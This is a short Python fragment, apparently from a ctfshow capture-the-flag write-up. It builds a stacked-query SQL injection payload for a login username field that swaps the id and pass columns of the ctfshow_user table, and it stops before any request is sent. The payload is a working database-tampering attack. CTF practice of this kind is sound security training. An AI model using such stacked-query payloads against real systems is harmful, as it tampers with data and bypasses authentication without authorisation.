def alter_table():
    &amp;quot;&amp;quot;&amp;quot;修改数据表，把 id 和 pass 对调&amp;quot;&amp;quot;&amp;quot;
    payload = (
        &amp;quot;0;alter table ctfshow_user change column pass tmp text;&amp;quot;
        &amp;quot;alter table ctfshow_user change column id pass int;&amp;quot;
        &amp;quot;alter table ctfshow_user change column tmp id text&amp;quot;
    )
    data = &amp;#123;
        &amp;quot;username&amp;quot;: payload,
        &amp;quot;password&amp;quot;: 1
    &amp;#125;
